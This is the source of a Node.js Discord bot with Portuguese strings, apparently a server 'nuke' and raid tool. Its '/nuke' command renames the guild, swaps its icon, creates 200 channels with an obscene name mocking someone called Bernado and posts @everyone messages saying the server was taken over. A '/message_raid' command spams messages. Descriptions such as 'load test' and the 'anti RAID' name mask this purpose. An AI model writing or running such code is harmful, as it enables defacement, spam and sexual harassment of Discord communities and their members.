const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, PermissionFlagsBits } = require('discord.js');
const express = require('express');
require('dotenv').config();

const app = express();
const port = process.env.PORT || 3000;

const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ]
});

const commands = [
    new SlashCommandBuilder()
        .setName('nuke')
        .setDescription('Executa protocolo de reestruturação massiva')
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder()
        .setName('message_raid')
        .setDescription('Teste de carga de mensagens')
        .addStringOption(option => 
            option.setName('texto')
                .setDescription('Conteúdo para o teste de saturação')
                .setRequired(true))
].map(command => command.toJSON());

const rest = new REST({ version: '10' }).setToken(TOKEN);

app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>[P] Bot Control</title>
            <style>
                body { background: #000; color: #0f0; font-family: monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
                .status { border: 1px solid #0f0; padding: 40px; text-align: center; box-shadow: 0 0 20px #0f0; border-radius: 10px; }
                button { background: #0f0; color: #000; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; margin-top: 20px; font-size: 1.2em; text-transform: uppercase; }
                button:hover { background: #0a0; box-shadow: 0 0 10px #0f0; }
                .glitch { font-size: 2.5em; margin-bottom: 10px; }
            </style>
        </head>
        <body>
            <div class="status">
                <div class="glitch">[P] SYSTEM</div>
                <p>STATUS: <span id="bot-status">${client.isReady() ? 'ATIVO' : 'AGUARDANDO CONEXÃO...'}</span></p>
                <button onclick="location.reload()">RECONECTAR / ATUALIZAR</button>
            </div>
        </body>
        </html>
    `);
});

client.on('ready', () => {
    console.log(`[P] Logado como ${client.user.tag}`);
    (async () => {
        try {
            await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
            console.log('[P] Comandos registrados.');
        } catch (error) {
            console.error('[P] Erro no registro:', error);
        }
    })();
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    const { commandName } = interaction;

    if (commandName === 'nuke') {
        await interaction.reply({ content: '[P] Protocolo Nuke iniciado.', ephemeral: true });

        try {
            await interaction.guild.setName('Theo bots anti RAID');
            await interaction.guild.setIcon('https://cdn.discordapp.com/attachments/1525751548477706351/1525871668780601384/IMG_6058.png');
        } catch (e) {}

        const channelName = 'MEU NOME É BERNADO EU SOU UM GULOSAO, EU QUERO DAR PRA UM MONTÃO';
        const messageContent = '@everyone ESTE SERVER FOI COMIDO PELO THEO, NÃO A NADA A SER FEITO \n ⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻꧄⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻꧄⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻꧄⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻꧄⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻꧄⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻꧄';

        const tasks = Array.from({ length: 200 }, async () => {
            try {
                const channel = await interaction.guild.channels.create({ name: channelName });
                await channel.send(messageContent);
            } catch (err) {}
        });

        Promise.allSettled(tasks);
    }

    if (commandName === 'message_raid') {
        const texto = interaction.options.getString('texto');
        await interaction.reply({ content: '[P] Iniciando raid.', ephemeral: true });

        for (let i = 0; i < 10; i++) {
            try { await interaction.channel.send(texto); } catch (e) {}
            await new Promise(r => setTimeout(r, 1000));
        }
    }
});

app.listen(port, () => {
    console.log(`[P] Servidor Web na porta ${port}`);
    if (TOKEN) {
        client.login(TOKEN).catch(err => console.error('[P] Falha no login:', err.message));
    }
});
